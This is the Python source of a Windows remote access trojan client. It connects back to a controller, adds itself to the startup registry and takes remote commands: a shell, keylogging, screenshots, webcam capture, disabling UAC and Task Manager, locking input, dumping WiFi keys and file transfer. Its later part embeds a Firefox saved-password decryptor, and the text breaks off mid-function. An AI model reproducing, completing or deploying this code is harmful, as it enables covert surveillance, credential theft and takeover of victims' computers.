from __future__ import annotations

import random
import socket, subprocess, os, platform
from threading import Thread
from PIL import Image
from datetime import datetime
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import shutil
import glob
import ctypes as ct
import sys
import webbrowser
import re
import pyautogui
import cv2
import urllib.request
import json
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard
import base64
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import sqlite3
import argparse
import logging
import locale
import platform
from getpass import getpass
from base64 import b64decode
from itertools import chain
from subprocess import run, PIPE, DEVNULL
from urllib.parse import urlparse
from configparser import ConfigParser
from typing import Optional, Iterator, Any
import time
import pickle
import winreg
import traceback

user32 = ct.WinDLL('user32')
kernel32 = ct.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

LHOST = "127.0.0.1"
LPORT = 4444
FILENAME = "client"
ICON = "icon.ico"

class CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.script_path = os.path.abspath(sys.argv[0])
    
    def add_to_startup_registry(self):
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "Host"
        value_data = self.script_path

        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, value_data)
        except Exception as e:
            print("Error adding to startup registry:", e)

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        global connected
        connected = False
        while not connected:
            try:
                s.connect((self.host, self.port))
                connected = True
            except:
                connected = False
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())
        
    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
    
    def keylogger(self):
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()
    
    def block_task_manager(self):
        if ct.windll.shell32.IsUserAnAdmin() == 1:
            while (1):
                if block == True:
                    hwnd = user32.FindWindowW(0, "Task Manager")
                    user32.ShowWindow(hwnd, 0)
                    ct.windll.kernel32.Sleep(500)
    
    def disable_all(self):
        while True:
            user32.BlockInput(True)
    
    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600*24*11
        while time.time() < t_end and mousedbl == True:
            mouse.position = (0, 0)
    
    def disable_keyboard(self):
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
        time.sleep(999999)
    
    def execute(self):
        while True:
            command = s.recv(1024).decode()
            
            if command == 'shell':
                exit = False
                while not exit:
                    command = s.recv(1024).decode()
                    if command.lower() == 'exit' :
                        exit = True
                    if command == 'cd':
                        os.chdir(command[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                    if not output:
                        self.errorsend()
            
            elif command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except:
                    s.send("Impossible to get screen")
            
            elif command == 'webcam':
                try:
                    from vidstream import CameraClient
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except:
                    s.send("Impossible to get webcam")
            
            elif command == 'breakstream':
                pass

            elif command == 'list':
                pass

            elif command == 'geolocate':
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                s.send(link.encode())
            
            elif command == 'setvalue':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                key2 = s.recv(1024).decode()
                value = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_LOCAL_MACHINE':
                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_USERS':
                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CURRENT_CONFIG':
                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    s.send("Value is set".encode())
                except:
                    s.send("Impossible to create key".encode())
            
            elif command == 'delkey':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_LOCAL_MACHINE':
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_USERS':
                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CLASSES_ROOT':
                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CURRENT_CONFIG':
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    s.send("Key is deleted".encode())
                except:
                    s.send("Impossible to delete key".encode())
            
            elif command == 'createkey':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_LOCAL_MACHINE':
                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_USERS':
                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CLASSES_ROOT':
                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CURRENT_CONFIG':
                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    s.send("Key is created".encode())
                except:
                    s.send("Impossible to create key".encode())
            
            elif command == 'volumeup':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    s.send("Volume is increased to 100%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'volumedown':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    s.send("Volume is decreased to 0%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'setwallpaper':
                pic = s.recv(6000).decode()
                try:
                    ct.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
                    s.send(f'{pic} is set as a wallpaper'.encode())
                except:
                    s.send("No such file")

            elif command == 'usbdrivers':
                p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
                s.send(p.encode())
            
            elif command == 'monitors':
                p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
                s.send(p.encode())

            elif command == 'sysinfo':
                sysinfo = str(f'''
System: {platform.platform()} {platform.win32_edition()}
Architecture: {platform.architecture()}
Name of Computer: {platform.node()}
Processor: {platform.processor()}
Python: {platform.python_version()}
Java: {platform.java_ver()}
User: {os.getlogin()}
                ''')
                s.send(sysinfo.encode())
            
            elif command == 'reboot':
                os.system("shutdown /r /t 1")
                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            
            elif command[:7] == 'writein':
                pyautogui.write(command.split(" ")[1])
                s.send(f'{command.split(" ")[1]} is written'.encode())
            
            elif command[:8] == 'readfile':
                try:
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: s.send("No data".encode())
                    f.close()
                    s.send(data.encode())
                except:
                    s.send("No such file in directory".encode())
            
            elif command[:7] == 'abspath':
                try:
                    path = os.path.abspath(command[8:])
                    s.send(path.encode())
                except:
                    s.send("No such file in directory".encode())

            elif command == 'pwd':
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'ipconfig':
                output = subprocess.check_output('ipconfig', encoding='oem')
                s.send(output.encode())
            
            elif command == 'portscan':
                output = subprocess.check_output('netstat -an', encoding='oem')
                s.send(output.encode())
            
            elif command == 'tasklist':
                output = subprocess.check_output('tasklist', encoding='oem')
                s.send(output.encode())

            elif command == 'profiles':
                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                s.send(output.encode())
            
            elif command == 'profilepswd':
                profile = s.recv(6000)
                profile = profile.decode()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command == 'systeminfo':
                output = subprocess.check_output(f'systeminfo', encoding='oem')
                s.send(output.encode())
            
            elif command == 'sendmessage':
                text = s.recv(6000).decode()
                title = s.recv(6000).decode()
                s.send('MessageBox has appeared'.encode())
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
            
            elif command.startswith("disable") and command.endswith("--all"):
                Thread(target=self.disable_all, daemon=True).start()
                s.send("Keyboard and mouse are disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--keyboard"):
                global kbrd
                kbrd = True
                Thread(target=self.disable_keyboard, daemon=True).start()
                s.send("Keyboard is disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--mouse"):
                global mousedbl
                mousedbl = True
                Thread(target=self.disable_mouse, daemon=True).start()
                s.send("Mouse is disabled".encode())
            
            elif command == 'disableUAC':
                os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            
            elif command.startswith("enable") and command.endswith("--keyboard"):
                kbrd = False
                s.send("Mouse and keyboard are unblocked".encode())
            
            elif command.startswith("enable") and command.endswith("--mouse"):
                mousedbl = False
                s.send("Mouse is enabled".encode())

            elif command.startswith("enable") and command.endswith("--all"):
                user32.BlockInput(False)
                s.send("Keyboard and mouse are enabled".encode())
                
            elif command == 'turnoffmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            
            elif command == 'turnonmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            
            elif command == 'extendrights':
                ct.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                s.send(sending.encode())
            
            elif command == 'isuseradmin':
                if ct.windll.shell32.IsUserAnAdmin() == 1:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    s.send(sending.encode())
                else:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    s.send(sending.encode())

            elif command == 'keyscan_start':
                global klgr
                klgr = True
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                Thread(target=self.keylogger, daemon=True).start()
                s.send("Keylogger is started".encode())
            
            elif command == 'send_logs':
                try:
                    f = open("keylogs.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    s.send(str(lines).encode())
                    os.remove('keylogs.txt')
                except:
                    self.errorsend()
            
            elif command == 'stop_keylogger':
                klgr = False
                s.send("The session of keylogger is terminated".encode())
            
            elif command == 'cpu_cores':
                output = os.cpu_count()
                s.send(str(output).encode())

            elif command[:7] == 'delfile':
                try:
                    os.remove(command[8:])
                    s.send(f'{command[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()
            
            elif command[:8] == 'editfile':
                try:
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    s.send(sending.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cp':
                try: 
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'mv':
                try:
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cd':
                command = command[3:]
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except:
                    s.send("No such directory".encode())
            
            elif command == 'cd ..':
                os.chdir('..')
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'dir':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command[1:2] == ':':
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except: 
                    s.send("No such directory".encode())
            
            elif command[:10] == 'createfile':
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                s.send(f'{command[11:]} was created'.encode())

            elif command[:10] == 'searchfile':
                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        s.send(str(path).encode())
                    else:
                        continue
            
            elif command == 'curpid':
                pid = os.getpid()
                s.send(str(pid).encode())
            
            elif command == 'drivers':
                drives = []
                bitmask = kernel32.GetLogicalDrives()
                letter = ord('A')
                while bitmask > 0:
                    if bitmask & 1:
                        drives.append(chr(letter) + ':\\')
                    bitmask >>= 1
                    letter += 1
                s.send(str(drives).encode())
            
            elif command[:4] == 'kill':
                try:
                    os.system(f'TASKKILL /F /im {command[5:]}')
                    s.send(f'{command[5:]} was terminated'.encode())
                except:
                    self.errorsend()
            
            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s.send("Pc was shutdown")
            
            elif command == 'disabletaskmgr':
                global block
                block = True
                Thread(target=self.block_task_manager, daemon=True).start()
                s.send("Task Manager is disabled".encode())
            
            elif command == 'enabletaskmgr':
                block = False
                s.send("Task Manager is enabled".encode())
            
            elif command == 'localtime':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                s.send(str(current_time).encode())
            
            elif command[:9] == 'startfile':
                try:
                    s.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    self.errorsend()

            elif command[:8] == 'download':
                try:
                    file = open(command.split(" ")[1], 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif command == 'upload':
                filename = s.recv(6000)
                newfile = open(filename, 'wb')
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()
            
            elif command[:5] == 'mkdir':
                try:
                    os.mkdir(command[6:])
                    s.send(f'Directory {command[6:]} was created'.encode())
                except:
                    self.errorsend()
            
            elif command[:5] == 'rmdir':
                try:
                    shutil.rmtree(command[6:])
                    s.send(f'Directory {command[6:]} was removed'.encode())
                except:
                    self.errorsend()
            
            elif command == 'browser':
                quiery = s.recv(6000)
                quiery = quiery.decode()
                try:
                    if re.search(r'\.', quiery):
                        webbrowser.open_new_tab('https://' + quiery)
                    elif re.search(r'\ ', quiery):
                        webbrowser.open_new_tab(f'https://www.google.com/search?q={quiery}')
                    else:
                        webbrowser.open_new_tab(f'https://google.com/search?q={quiery}')
                    s.send("The tab is opened".encode())
                except:
                    self.errorsend()
            
            elif command == 'screenshot':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    pyautogui.screenshot(file)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()
            
            elif command == 'webcam_snap':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    global return_value, i
                    cam = cv2.VideoCapture(0)
                    for i in range(1):
                        return_value, image = cam.read()
                        filename = cv2.imwrite(f'{file}', image)
                    del(cam)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif command == 'exit':
                sock.build_connection()

            elif command == 'get_passwords_firefox':
                VERBOSE = False
                SYSTEM = platform.system()
                SYS64 = sys.maxsize > 2**32
                DEFAULT_ENCODING = "utf-8"

                PWStore = list[dict[str, str]]


                def get_version() -> str:
                    """Obtain version information from git if available otherwise use
                    the internal version number
                    """

                    def internal_version():
                        return ".".join(map(str, __version_info__[:3])) + "".join(__version_info__[3:])

                    try:
                        p = run(["git", "describe", "--tags"], stdout=PIPE, stderr=DEVNULL, text=True)
                    except FileNotFoundError:
                        return internal_version()

                    if p.returncode:
                        return internal_version()
                    else:
                        return p.stdout.strip()


                __version_info__ = (1, 1, 0, "+git")
                __version__: str = get_version()


                class NotFoundError(Exception):
                    """Exception to handle situations where a credentials file is not found"""

                    pass


                class Exit(Exception):
                    """Exception to allow a clean exit from any point in execution"""

                    CLEAN = 0
                    ERROR = 1
                    MISSING_PROFILEINI = 2
                    MISSING_SECRETS = 3
                    BAD_PROFILEINI = 4
                    LOCATION_NO_DIRECTORY = 5
                    BAD_SECRETS = 6
                    BAD_LOCALE = 7

                    FAIL_LOCATE_NSS = 10
                    FAIL_LOAD_NSS = 11
                    FAIL_INIT_NSS = 12
                    FAIL_NSS_KEYSLOT = 13
                    FAIL_SHUTDOWN_NSS = 14
                    BAD_PRIMARY_PASSWORD = 15
                    NEED_PRIMARY_PASSWORD = 16
                    DECRYPTION_FAILED = 17

                    PASSSTORE_NOT_INIT = 20
                    PASSSTORE_MISSING = 21
                    PASSSTORE_ERROR = 22

                    READ_GOT_EOF = 30
                    MISSING_CHOICE = 31
                    NO_SUCH_PROFILE = 32

                    UNKNOWN_ERROR = 100
                    KEYBOARD_INTERRUPT = 102

                    def __init__(self, exitcode):
                        self.exitcode = exitcode

                    def __unicode__(self):
                        return f"Premature program exit with exit code {self.exitcode}"


                class Credentials:
                    """Base credentials backend manager"""

                    def __init__(self, db):
                        self.db = db

                        LOG.debug("Database location: %s", self.db)
                        if not os.path.isfile(db):
                            raise NotFoundError(f"ERROR - {db} database not found\n")

                        LOG.info("Using %s for credentials.", db)

                    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
                        pass

                    def done(self):
                        """Override this method if the credentials subclass needs to do any
                        action after interaction
                        """
                        pass


                class SqliteCredentials(Credentials):
                    """SQLite credentials backend manager"""

                    def __init__(self, profile):
                        db = os.path.join(profile, "signons.sqlite")

                        super(SqliteCredentials, self).__init__(db)

                        self.conn = sqlite3.connect(db)
                        self.c = self.conn.cursor()

                    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
                        LOG.debug("Reading password database in SQLite format")
                        self.c.execute(
                            "SELECT hostname, encryptedUsername, encryptedPassword, encType "
                            "FROM moz_logins"
                        )
                        for i in self.c:
                            # yields hostname, encryptedUsername, encryptedPassword, encType
                            yield i

                    def done(self):
                        """Close the sqlite cursor and database connection"""
                        super(SqliteCredentials, self).done()

                        self.c.close()
                        self.conn.close()


                class JsonCredentials(Credentials):
                    """JSON credentials backend manager"""

                    def __init__(self, profile):
                        db = os.path.join(profile, "logins.json")

                        super(JsonCredentials, self).__init__(db)

                    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
                        with open(self.db) as fh:
                            LOG.debug("Reading password database in JSON format")
                            data = json.load(fh)

                            try:
                                logins = data["logins"]
                            except Exception:
                                LOG.error(f"Unrecognized format in {self.db}")
                                raise Exit(Exit.BAD_SECRETS)

                            for i in logins:
                                yield (
                                    i["hostname"],
                                    i["encryptedUsername"],
                                    i["encryptedPassword"],
                                    i["encType"],
                                )


                def find_nss(locations, nssname) -> ct.CDLL:
                    """Locate nss is one of the many possible locations"""
                    fail_errors: list[tuple[str, str]] = []

                    OS = ("Windows", "Darwin")

                    for loc in locations:
                        nsslib = os.path.join(loc, nssname)
                        LOG.debug("Loading NSS library from %s", nsslib)

                        if SYSTEM in OS:
                            # On windows in order to find DLLs referenced by nss3.dll
                            # we need to have those locations on PATH
                            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
                            LOG.debug("PATH is now %s", os.environ["PATH"])
                            # However this doesn't seem to work on all setups and needs to be
                            # set before starting python so as a workaround we chdir to
                            # Firefox's nss3.dll/libnss3.dylib location
                            if loc:
                                if not os.path.isdir(loc):
                                    # No point in trying to load from paths that don't exist
                                    continue

                                workdir = os.getcwd()
                                os.chdir(loc)

                        try:
                            nss: ct.CDLL = ct.CDLL(nsslib)
                        except OSError as e:
                            fail_errors.append((nsslib, str(e)))
                        else:
                            LOG.debug("Loaded NSS library from %s", nsslib)
                            return nss
                        finally:
                            if SYSTEM in OS and loc:
                                # Restore workdir changed above
                                os.chdir(workdir)

                    else:
                        LOG.error(
                            "Couldn't find or load '%s'. This library is essential "
                            "to interact with your Mozilla profile.",
                            nssname,
                        )
                        LOG.error(
                            "If you are seeing this error please perform a system-wide "
                            "search for '%s' and file a bug report indicating any "
                            "location found. Thanks!",
                            nssname,
                        )
                        LOG.error(
                            "Alternatively you can try launching firefox_decrypt "
                            "from the location where you found '%s'. "
                            "That is 'cd' or 'chdir' to that location and run "
                            "firefox_decrypt from there.",
                            nssname,
                        )

                        LOG.error(
                            "Please also include the following on any bug report. "
                            "Errors seen while searching/loading NSS:"
                        )

                        for target, error in fail_errors:
                            LOG.error("Error when loading %s was %s", target, error)

                        raise Exit(Exit.FAIL_LOCATE_NSS)


                def load_libnss():
                    """Load libnss into python using the CDLL interface"""
                    if SYSTEM == "Windows":
                        nssname = "nss3.dll"
                        locations: list[str] = [
                            "",  # Current directory or system lib finder
                            os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
                            os.path.expanduser("~\\AppData\\Local\\Firefox Developer Edition"),
                            os.path.expanduser("~\\AppData\\Local\\Mozilla Thunderbird"),
                            os.path.expanduser("~\\AppData\\Local\\Nightly"),
                            os.path.expanduser("~\\AppData\\Local\\SeaMonkey"),
                            os.path.expanduser("~\\AppData\\Local\\Waterfox"),
                            "C:\\Program Files\\Mozilla Firefox",
                            "C:\\Program Files\\Firefox Developer Edition",
                            "C:\\Program Files\\Mozilla Thunderbird",
                            "C:\\Program Files\\Nightly",
                            "C:\\Program Files\\SeaMonkey",
                            "C:\\Program Files\\Waterfox",
                        ]
                        if not SYS64:
                            locations = [
                                "",  # Current directory or system lib finder
                                "C:\\Program Files (x86)\\Mozilla Firefox",
                                "C:\\Program Files (x86)\\Firefox Developer Edition",
                                "C:\\Program Files (x86)\\Mozilla Thunderbird",
                                "C:\\Program Files (x86)\\Nightly",
                                "C:\\Program Files (x86)\\SeaMonkey",
                                "C:\\Program Files (x86)\\Waterfox",
                            ] + locations

                        # If either of the supported software is in PATH try to use it
                        software = ["firefox", "thunderbird", "waterfox", "seamonkey"]
                        for binary in software:
                            location: Optional[str] = shutil.which(binary)
                            if location is not None:
                                nsslocation: str = os.path.join(os.path.dirname(location), nssname)
                                locations.append(nsslocation)

                    elif SYSTEM == "Darwin":
                        nssname = "libnss3.dylib"
                        locations = (
                            "",  # Current directory or system lib finder
                            "/usr/local/lib/nss",
                            "/usr/local/lib",
                            "/opt/local/lib/nss",
                            "/sw/lib/firefox",
                            "/sw/lib/mozilla",
                            "/usr/local/opt/nss/lib",  # nss installed with Brew on Darwin
                            "/opt/pkg/lib/nss",  # installed via pkgsrc
                            "/Applications/Firefox.app/Contents/MacOS",  # default manual install location
                            "/Applications/Thunderbird.app/Contents/MacOS",
                            "/Applications/SeaMonkey.app/Contents/MacOS",
                            "/Applications/Waterfox.app/Contents/MacOS",
                        )

                    else:
                        nssname = "libnss3.so"
                        if SYS64:
                            locations = (
                                "",  # Current directory or system lib finder
                                "/usr/lib64",
                                "/usr/lib64/nss",
                                "/usr/lib",
                                "/usr/lib/nss",
                                "/usr/local/lib",
                                "/usr/local/lib/nss",
                                "/opt/local/lib",
                                "/opt/local/lib/nss",
                                os.path.expanduser("~/.nix-profile/lib"),
                            )
                        else:
                            locations = (
                                "",  # Current directory or system lib finder
                                "/usr/lib",
                                "/usr/lib/nss",
                                "/usr/lib32",
                                "/usr/lib32/nss",
                                "/usr/lib64",
                                "/usr/lib64/nss",
                                "/usr/local/lib",
                                "/usr/local/lib/nss",
                                "/opt/local/lib",
                                "/opt/local/lib/nss",
                                os.path.expanduser("~/.nix-profile/lib"),
                            )

                    # If this succeeds libnss was loaded
                    return find_nss(locations, nssname)


                class c_char_p_fromstr(ct.c_char_p):
                    """ctypes char_p override that handles encoding str to bytes"""

                    def from_param(self):
                        return self.encode(DEFAULT_ENCODING)


                class NSSProxy:
                    class SECItem(ct.Structure):
                        """struct needed to interact with libnss"""

                        _fields_ = [
                            ("type", ct.c_uint),
                            ("data", ct.c_char_p),  # actually: unsigned char *
                            ("len", ct.c_uint),
                        ]

                        def decode_data(self):
                            _bytes = ct.string_at(self.data, self.len)
                            return _bytes.decode(DEFAULT_ENCODING)

                    class PK11SlotInfo(ct.Structure):
                        """Opaque structure representing a logical PKCS slot"""

                    def __init__(self, non_fatal_decryption=False):
                        # Locate libnss and try loading it
                        self.libnss = load_libnss()
                        self.non_fatal_decryption = non_fatal_decryption

                        SlotInfoPtr = ct.POINTER(self.PK11SlotInfo)
                        SECItemPtr = ct.POINTER(self.SECItem)

                        self._set_ctypes(ct.c_int, "NSS_Init", c_char_p_fromstr)
                        self._set_ctypes(ct.c_int, "NSS_Shutdown")
                        self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
                        self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
                        self._set_ctypes(ct.c_int, "PK11_NeedLogin", SlotInfoPtr)
                        self._set_ctypes(
                            ct.c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p_fromstr
                        )
                        self._set_ctypes(
                            ct.c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, ct.c_void_p
                        )
                        self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, ct.c_int)

                        # for error handling
                        self._set_ctypes(ct.c_int, "PORT_GetError")
                        self._set_ctypes(ct.c_char_p, "PR_ErrorToName", ct.c_int)
                        self._set_ctypes(ct.c_char_p, "PR_ErrorToString", ct.c_int, ct.c_uint32)

                    def _set_ctypes(self, restype, name, *argtypes):
                        """Set input/output types on libnss C functions for automatic type casting"""
                        res = getattr(self.libnss, name)
                        res.argtypes = argtypes
                        res.restype = restype

                        # Transparently handle decoding to string when returning a c_char_p
                        if restype == ct.c_char_p:

                            def _decode(result, func, *args):
                                try:
                                    return result.decode(DEFAULT_ENCODING)
                                except AttributeError:
                                    return result

                            res.errcheck = _decode

                        setattr(self, "_" + name, res)

                    def initialize(self, profile: str):
                        # The sql: prefix ensures compatibility with both
                        # Berkley DB (cert8) and Sqlite (cert9) dbs
                        profile_path = "sql:" + profile
                        LOG.debug("Initializing NSS with profile '%s'", profile_path)
                        err_status: int = self._NSS_Init(profile_path)
                        LOG.debug("Initializing NSS returned %s", err_status)

                        if err_status:
                            self.handle_error(
                                Exit.FAIL_INIT_NSS,
                                "Couldn't initialize NSS, maybe '%s' is not a valid profile?",
                                profile,
                            )

                    def shutdown(self):
                        err_status: int = self._NSS_Shutdown()

                        if err_status:
                            self.handle_error(
                                Exit.FAIL_SHUTDOWN_NSS,
                                "Couldn't shutdown current NSS profile",
                            )

                    def authenticate(self, profile, interactive):
                        """Unlocks the profile if necessary, in which case a password
                        will prompted to the user.
                        """
                        LOG.debug("Retrieving internal key slot")
                        keyslot = self._PK11_GetInternalKeySlot()

                        LOG.debug("Internal key slot %s", keyslot)
